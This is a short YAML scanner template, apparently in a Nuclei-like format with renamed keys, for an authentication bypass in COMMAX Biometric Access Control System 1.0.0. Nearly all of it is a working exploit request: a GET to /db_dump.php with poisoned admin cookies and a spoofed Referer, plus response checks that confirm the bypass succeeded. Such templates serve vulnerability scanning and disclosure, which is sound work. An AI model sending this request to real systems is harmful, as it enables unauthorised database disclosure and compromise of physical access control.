id: commax-biometric-auth-bypass
brief:
    title: COMMAX Biometric Access Control System 1.0.0 - Authentication Bypass
    by: gy741
    level: critical
    about: COMMAX Biometric Access Control System 1.0.0 suffers from an authentication bypass vulnerability. An unauthenticated attacker through cookie poisoning can bypass authentication and disclose sensiti...
    label:
        - commax
        - auth-bypass
        - edb
        - vuln
moves:
    - verb: GET
      to:
        - '{{BaseURL}}/db_dump.php'
      head:
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
        Cookie: CMX_SAVED_ID=zero; CMX_ADMIN_ID=science; CMX_ADMIN_NM=liquidworm; CMX_ADMIN_LV=9; CMX_COMPLEX_NM=ZSL; CMX_COMPLEX_IP=2.5.1.0
        Referer: '{{BaseURL}}/user_add.php'
      signs:
        - "on": word
          has:
            - '<title>::: COMMAX :::</title>'
          in: body
          need: all
        - "on": word
          has:
            - text/html
          in: header
          need: all
        - "on": status
          status:
            - 200
